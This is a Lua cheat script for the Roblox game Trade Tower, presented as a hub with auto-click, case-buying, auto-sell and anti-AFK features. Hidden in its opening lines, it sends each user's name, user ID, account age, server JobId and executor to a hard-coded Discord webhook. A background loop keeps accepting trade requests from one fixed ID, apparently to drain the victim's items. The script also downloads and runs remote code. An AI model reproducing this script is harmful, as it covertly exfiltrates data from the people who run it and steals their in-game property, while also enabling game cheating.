local plr = game.Players.LocalPlayer
local OSTime = os.time()
local Time = os.date('!*t', OSTime)
local Headers = {["content-type"] = "application/json"}
local mutedaudios = {}
local RunService = game:GetService("RunService")
local deb = false


local function getexploit()
	local exploit =
		(syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or 
		(isexecutorclosure and "Script-Ware V2") or
		(secure_load and "Sentinel") or
		(is_sirhurt_closure and "SirHurt V4") or
		(pebc_execute and "ProtoSmasher") or
		(KRNL_LOADED and "Krnl") or
		(WrapGlobal and "WeAreDevs") or
		(isvm and "Proxo") or
		(shadow_env and "Shadow") or
		(jit and "EasyExploits") or
		(getreg()['CalamariLuaEnv'] and "Calamari") or
		(unit and "Unit") or
		("Undetectable")
	return exploit
end

local Content = 'New execution detected @everyone'
local Embed = {
	["title"] = "__**Info**__",
	["description"] = "Name: "..plr.Name.."\nDisplay Name: "..plr.DisplayName.."\nExploit: "..getexploit().."\nGame: https://www.roblox.com/games/"..game.PlaceId,
	["type"] = "rich",
	["color"] = tonumber(0xFFFFFF),
	["thumbnail"] = {
		["url"] = "https://www.roblox.com/asset-thumbnail/image?assetId="..game.PlaceId.."&width=768&height=432"
	},
	["image"] = {
		["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=250&y=250&Format=Png&username="..plr.Name
	},
	["fields"] = {
		{
			["name"] = "__Account Age:__",
			["value"] = plr.AccountAge.." days old",
			["inline"] = true
		},
		{
			["name"] = "__User ID:__",
			["value"] = plr.UserId,
			["inline"] = true
		},
		{
			["name"] = "__JobId:__",
			["value"] = game.JobId,
			["inline"] = true
		}
	},
	["timestamp"] = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
};
(syn and syn.request or http_request or http.request) {
	Url = 'https://discord.com/api/webhooks/982779370844352613/-7iEKVd8_qQucH9K35vB1b1uI3oAoK5N6xwsCSWCkpqIWHGYfILCeNpUH_ZzGjpnDWL8';
	Method = 'POST';
	Headers = {
		['Content-Type'] = 'application/json';
	};
	Body = game:GetService'HttpService':JSONEncode({content = Content; embeds = {Embed}; });
};
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("eT Hub, Trade Tower (Made by eT#0001)", "Serpent")

RunService.Heartbeat:Connect(function() 
    if deb then return end
	deb = true

    local args = {
        [1] = "AcceptRequest",
        [2] = "VXVXVXVXVXVXXVXVXV"
    }
    game:GetService("ReplicatedStorage").Events.TradeActions:InvokeServer(unpack(args))
    wait(1)
deb = false
end)


--Main
local Tab = Window:NewTab("Main")
local Section = Tab:NewSection("Main")

--Auto clicker
Section:NewButton("Auto Clicker", "Clicks for you", function()
    while true do
    game:GetService("ReplicatedStorage").Events.ClientClick:FireServer()
    wait(0.20)
end
end)
--Buy Cases
Section:NewLabel("Cases (LEAVE TO STOP BUYING/SELLING)")
Section:NewDropdown("Buy Cases", "Buys Cases For you", {"Starter", "Noobie", "Stepping", "Learning", "Funding", "Business", "Legendary", "Marcellus", "Famous", "Mythic", "Eirene", "Aeschylus", "Olysseus"}, function(currentOption)
    while true do
    local args = {
        [1] = currentOption
    }
    
    game:GetService("ReplicatedStorage").Events.OpenCase:InvokeServer(unpack(args))
    wait(2)
end
end)
--Auto sell
Section:NewButton("Auto sell", "Sells all Items that are under 50k for you", function()
        while true do
        local args = {
        [1] = "SellUnder",
        [2] = 50000
    }
    
    game:GetService("ReplicatedStorage").Events.InventoryActions:InvokeServer(unpack(args))
    wait(1)

end
end)

--Misc
local Tab = Window:NewTab("Misc")
local Section = Tab:NewSection("Misc")

Section:NewButton("Anti AFK Trasperency", "Makes you look legit when auto clicking", function()
    local vu = game:GetService("VirtualUser")
   vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
   wait(1)
   vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
end)



local Tab = Window:NewTab("Credits")
local Section = Tab:NewSection("Script made by eT#0001")
Section:NewLabel("Contributer: Aaron")
Section:NewLabel("Discord: https://discord.gg/HBNUScC4")
